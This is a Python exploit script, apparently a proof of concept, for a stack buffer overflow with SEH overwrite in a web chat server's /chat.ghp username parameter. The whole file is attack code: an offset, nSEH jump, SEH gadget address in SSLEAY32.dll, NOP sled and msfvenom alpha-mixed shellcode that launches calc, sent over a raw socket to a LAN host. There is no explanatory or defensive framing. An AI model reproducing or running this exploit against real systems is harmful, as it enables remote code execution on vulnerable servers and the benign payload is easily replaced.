import socket

ip = "192.168.1.9"
port = 80

# bad chars for het request \x00\x20\x0a\x0d


offset = "A"*(221-4)
nseh = "\xeb\x06\x90\x90"
seh = "\xe7\x0f\x01\x10"      #0x10010FE7 SSLEAY32.dll
junk = "\x90"*16

# msfvenom -p windows/exec cmd=calc.exdows -a x86 -e x86/alpha_mixed -b \x00\x0a\x0d\x20 -f python -v calc
calc =  ""
calc += "\xdb\xd1\xd9\x74\x24\xf4\x5f\x57\x59\x49\x49\x49\x49"
calc += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
calc += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
calc += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
calc += "\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x58\x68\x4c\x42"
calc += "\x45\x50\x63\x30\x65\x50\x35\x30\x4d\x59\x68\x65\x44"
calc += "\x71\x4f\x30\x75\x34\x4c\x4b\x52\x70\x34\x70\x6c\x4b"
calc += "\x31\x42\x46\x6c\x4e\x6b\x66\x32\x45\x44\x6e\x6b\x62"
calc += "\x52\x65\x78\x64\x4f\x6d\x67\x71\x5a\x44\x66\x45\x61"
calc += "\x79\x6f\x4e\x4c\x47\x4c\x51\x71\x71\x6c\x76\x62\x46"
calc += "\x4c\x61\x30\x6f\x31\x38\x4f\x46\x6d\x76\x61\x48\x47"
calc += "\x6b\x52\x49\x62\x76\x32\x62\x77\x4c\x4b\x63\x62\x52"
calc += "\x30\x4e\x6b\x31\x5a\x35\x6c\x4c\x4b\x50\x4c\x52\x31"
calc += "\x32\x58\x4d\x33\x50\x48\x45\x51\x4b\x61\x76\x31\x6e"
calc += "\x6b\x66\x39\x57\x50\x43\x31\x4e\x33\x4e\x6b\x53\x79"
calc += "\x67\x68\x58\x63\x65\x6a\x63\x79\x4c\x4b\x30\x34\x6e"
calc += "\x6b\x36\x61\x78\x56\x45\x61\x79\x6f\x6e\x4c\x79\x51"
calc += "\x78\x4f\x46\x6d\x75\x51\x5a\x67\x64\x78\x49\x70\x44"
calc += "\x35\x7a\x56\x73\x33\x61\x6d\x79\x68\x37\x4b\x61\x6d"
calc += "\x77\x54\x72\x55\x6a\x44\x42\x78\x4c\x4b\x72\x78\x77"
calc += "\x54\x65\x51\x7a\x73\x61\x76\x4e\x6b\x74\x4c\x70\x4b"
calc += "\x4c\x4b\x52\x78\x55\x4c\x37\x71\x4b\x63\x4e\x6b\x56"
calc += "\x64\x6c\x4b\x77\x71\x48\x50\x4e\x69\x62\x64\x34\x64"
calc += "\x36\x44\x61\x4b\x73\x6b\x75\x31\x33\x69\x71\x4a\x76"
calc += "\x31\x69\x6f\x4d\x30\x43\x6f\x31\x4f\x32\x7a\x4e\x6b"
calc += "\x67\x62\x4a\x4b\x6e\x6d\x53\x6d\x53\x5a\x43\x31\x4e"
calc += "\x6d\x6e\x65\x68\x32\x53\x30\x65\x50\x35\x50\x66\x30"
calc += "\x70\x68\x65\x61\x6c\x4b\x50\x6f\x6b\x37\x59\x6f\x48"
calc += "\x55\x6d\x6b\x38\x70\x6c\x75\x4e\x42\x43\x66\x52\x48"
calc += "\x59\x36\x6d\x45\x4d\x6d\x6d\x4d\x79\x6f\x68\x55\x75"
calc += "\x6c\x43\x36\x43\x4c\x64\x4a\x4d\x50\x4b\x4b\x39\x70"
calc += "\x70\x75\x43\x35\x4d\x6b\x70\x47\x66\x73\x51\x62\x30"
calc += "\x6f\x70\x6a\x45\x50\x71\x43\x59\x6f\x38\x55\x63\x53"
calc += "\x33\x51\x42\x4c\x52\x43\x64\x6e\x51\x75\x63\x48\x43"
calc += "\x55\x43\x30\x41\x41"


buffer = offset + nseh + seh + junk + calc

req = "GET /chat.ghp?username=" + buffer + "&password=&room=1&sex=2 HTTP/1.1\r\n"
req += "User-Agent: Mozilla/4.0\r\n"
req += "Host: 192.168.1.9:80\r\n"
req += "Accept-Language: en-us\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.1.136\r\n"
req += "Connection: Keep-Alive\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip,port))
s.send(req)
s.recv(1024)
s.close()
